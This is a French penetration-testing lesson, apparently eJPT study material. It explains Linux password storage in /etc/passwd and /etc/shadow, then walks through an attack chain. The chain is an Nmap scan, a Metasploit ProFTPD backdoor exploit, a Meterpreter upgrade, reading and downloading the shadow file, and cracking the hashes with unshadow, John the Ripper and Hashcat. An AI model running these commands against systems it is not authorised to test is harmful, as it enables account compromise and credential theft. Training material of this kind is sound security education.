# Linux Credential Dumping

Cette leçon couvre comment Linux stocke les mots de passe, comment les attaquants les extraient et comment les hashes capturés sont utilisés pour le craquage hors ligne — des techniques critiques pour l'eJPT.

> ⚠️ **Note** : Toutes les techniques nécessitent un **accès root** sur le système Linux cible. Contrairement à Windows, les hashes de mots de passe Linux **ne peuvent pas être utilisés directement pour l'authentification** — ils doivent être craqués hors ligne pour obtenir les mots de passe en clair.

---

## Comment Linux Stocke les Mots de Passe

Linux utilise un **système à deux fichiers** pour stocker les informations de compte utilisateur et les hashes de mots de passe séparément, offrant une couche de sécurité importante.

### Le Fichier /etc/passwd

Le fichier `/etc/passwd` stocke les **informations de compte de base** pour chaque utilisateur du système.

```bash
cat /etc/passwd
```

**Points clés** :
- Lisible par **n'importe quel utilisateur** du système.
- Ne **contient pas** de hashes de mots de passe réels dans Linux moderne.
- Chaque ligne représente un compte utilisateur dans ce format :

```
nom_utilisateur:x:UID:GID:commentaire:rep_home:shell
```

Le `x` dans le champ mot de passe signifie que le hash réel est stocké dans `/etc/shadow`. Si vous voyez un hash directement ici au lieu de `x`, le système est obsolète et non sécurisé.

### Le Fichier /etc/shadow

Le fichier `/etc/shadow` stocke les **hashes de mots de passe réels** pour tous les comptes utilisateurs.

```bash
cat /etc/shadow
```

**Points clés** :
- Lisible **uniquement par root** — c'est une fonctionnalité de sécurité critique.
- Chaque ligne suit ce format :

```
nom_utilisateur:$id$sel$hash:derniere_modif:min:max:avertissement:inactif:expire
```

Le champ hash (`$id$sel$hash`) vous dit tout ce dont vous avez besoin :
- `$id` — identifie l'**algorithme de hachage** utilisé.
- `$sel` — valeur aléatoire ajoutée avant le hachage (rend les rainbow tables inefficaces).
- `$hash` — le hash de mot de passe réel.

### Algorithmes de Hachage Linux

Le chiffre après le premier `$` dans le fichier shadow identifie l'algorithme :

| ID | Algorithme | Force |
|----|-----------|-------|
| `$1` | MD5 | Faible — rapide à craquer |
| `$2` | Blowfish | Modéré |
| `$5` | SHA-256 | Fort |
| `$6` | SHA-512 | Très Fort — le plus courant sur Linux moderne |

Exemple d'entrée shadow :
```
root:$6$sel$hashdemdp:18000:0:99999:7:::
```
→ Le mot de passe de cet utilisateur est haché avec **SHA-512** (`$6`).

> **Contrairement aux hashes NTLM de Windows**, les hashes Linux incluent un **sel** — rendant les attaques Pass-the-Hash impossibles et les rainbow tables inefficaces. Le craquage nécessite des attaques par force brute ou par dictionnaire contre chaque hash individuellement.

---

## Dumping de Credentials Linux vs Windows

| Fonctionnalité | Linux | Windows |
|----------------|-------|---------|
| **Stockage des hashes** | `/etc/shadow` (root uniquement) | Base SAM (verrouillée par le noyau) |
| **Algorithme de hash** | MD5, SHA-256, SHA-512 (avec sel) | LM / NTLM (sans sel) |
| **Pass-the-Hash** | ❌ Impossible | ✅ Possible avec NTLM |
| **Rainbow tables** | ❌ Le sel l'empêche | ✅ Efficaces contre LM/NTLM |
| **Attaque principale** | Craquage hors ligne (Hashcat/John) | Pass-the-Hash / craquage |

---

## Extraction des Hashes de Mots de Passe Linux

### Étape 1 : Obtenir l'Accès Initial

Exécuter un scan Nmap pour identifier les services exploitables :

```bash
nmap -sV -sC <target_ip>
```

Exemple — cible exécutant **ProFTPD sur le port 21** :

```bash
# Rechercher des exploits
searchsploit ProFTPD

# Lancer Metasploit
msfconsole
msf6 > search ProFTPD
msf6 > use exploit/unix/ftp/proftpd_<version>_backdoor
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <votre_ip>
msf6 > exploit
```

### Étape 2 : Améliorer vers un Shell Approprié

Si vous obtenez une session shell basique, améliorez-la :

```bash
# Ouvrir un shell bash interactif approprié
/bin/bash -i
```

Puis mettre à niveau vers une session Meterpreter pour plus de capacités :

```bash
# Mettre en arrière-plan la session shell actuelle
# Dans Metasploit :
msf6 > sessions -u <session_id>
```

`sessions -u` met à niveau automatiquement un shell basique vers une session Meterpreter complète.

### Étape 3 : Vérifier l'Accès Root

```bash
meterpreter > getuid
whoami   # Doit retourner : root
id
```

Vous avez besoin de root pour accéder à `/etc/shadow`.

### Étape 4 : Lire le Fichier Shadow Directement

Avec l'accès root, lisez le fichier shadow :

```bash
meterpreter > shell
cat /etc/shadow
```

Exemple de sortie :
```
root:$6$abc123$hashedpassword...:18000:0:99999:7:::
admin:$6$xyz789$anotherhash...:18000:0:99999:7:::
```

Télécharger les fichiers sur Kali pour le craquage hors ligne :

```bash
meterpreter > download /etc/shadow /root/shadow.txt
meterpreter > download /etc/passwd /root/passwd.txt
```

### Étape 5 : Utiliser le Module hashdump de Metasploit

Metasploit dispose d'un module de post-exploitation dédié qui extrait les hashes Linux dans un format prêt pour le craquage :

```bash
meterpreter > background
msf6 > use post/linux/gather/hashdump
msf6 > set SESSION <session_id>
msf6 > run
```

Format de sortie : `nom_utilisateur:$id$sel$hash`

---

## Craquage des Hashes Linux

Contrairement à Windows, vous **ne pouvez pas utiliser les hashes Linux directement** pour l'authentification — vous devez les craquer pour obtenir le mot de passe en clair.

### Méthode A : Unshadow + John the Ripper

D'abord, combinez `/etc/passwd` et `/etc/shadow` en un seul fichier craquable :

```bash
# Sur Kali — combiner les deux fichiers
unshadow /root/passwd.txt /root/shadow.txt > /root/unshadowed.txt

# Craquer avec John the Ripper en utilisant une wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /root/unshadowed.txt

# Afficher les mots de passe craqués
john --show /root/unshadowed.txt
```

### Méthode B : Hashcat

Hashcat est plus rapide pour le craquage accéléré par GPU :

```bash
# SHA-512 (mode 1800), SHA-256 (mode 7400), MD5 (mode 500)
hashcat -m 1800 /root/shadow.txt /usr/share/wordlists/rockyou.txt

# Afficher les mots de passe craqués
hashcat -m 1800 /root/shadow.txt --show
```

### Référence des Modes Hashcat pour les Hashes Linux

| ID de Hash | Algorithme | Mode Hashcat |
|-----------|-----------|-------------|
| `$1` | MD5 | `500` |
| `$2` | Blowfish | `3200` |
| `$5` | SHA-256 | `7400` |
| `$6` | SHA-512 | `1800` |

---

## Chaîne d'Attaque Complète

```
Scan Nmap → Exploiter Service → Shell → Mettre à Niveau Meterpreter → Accès Root → Extraire /etc/shadow → Craquer Hashes
```

| Étape | Action | Outil |
|-------|--------|-------|
| **1** | Scanner les services exploitables | Nmap |
| **2** | Exploiter le service | Metasploit |
| **3** | Mettre à niveau le shell | `sessions -u <id>` |
| **4** | Vérifier l'accès root | `getuid` / `whoami` |
| **5** | Extraire les hashes | `cat /etc/shadow` / `post/linux/gather/hashdump` |
| **6** | Télécharger les fichiers | `download /etc/shadow` |
| **7** | Craquer les hashes hors ligne | John the Ripper / Hashcat |

---

## Points Clés

- Linux utilise **deux fichiers** pour le stockage des credentials : `/etc/passwd` (public, infos de compte) et `/etc/shadow` (root uniquement, hashes de mots de passe).
- `/etc/passwd` est lisible par tous les utilisateurs mais **ne contient pas de hashes réels** dans Linux moderne — juste un `x` comme espace réservé.
- `/etc/shadow` est lisible **uniquement par root** — c'est le contrôle de sécurité principal protégeant les hashes de mots de passe.
- Le format de hash `$id$sel$hash` vous indique l'**algorithme** (`$6` = SHA-512), le **sel** et le **hash**.
- Les hashes Linux incluent un **sel** — les rainbow tables et les attaques Pass-the-Hash sont **impossibles**. Le craquage hors ligne est la seule option.
- Algorithmes courants : `$1` = MD5 (faible), `$5` = SHA-256, `$6` = SHA-512 (le plus courant sur les systèmes modernes).
- Utilisez **`sessions -u <id>`** dans Metasploit pour mettre à niveau un shell basique vers une session Meterpreter complète.
- Utilisez **`post/linux/gather/hashdump`** pour extraire les hashes dans un format prêt pour le craquage.
- **Téléchargez `/etc/passwd` et `/etc/shadow`** — vous avez besoin des deux pour `unshadow` + John the Ripper.
- **`unshadow`** combine les deux fichiers en un seul format craquable pour John the Ripper.
- **John the Ripper** : `john --wordlist=rockyou.txt unshadowed.txt` → `john --show` pour afficher les résultats.
- **Hashcat** : utilisez le mode `1800` pour SHA-512 (`$6`), `7400` pour SHA-256 (`$5`), `500` pour MD5 (`$1`).
- Contrairement à Windows, les **mots de passe en clair** craqués sont ceux que vous utilisez pour accéder davantage — pas les hashes eux-mêmes.
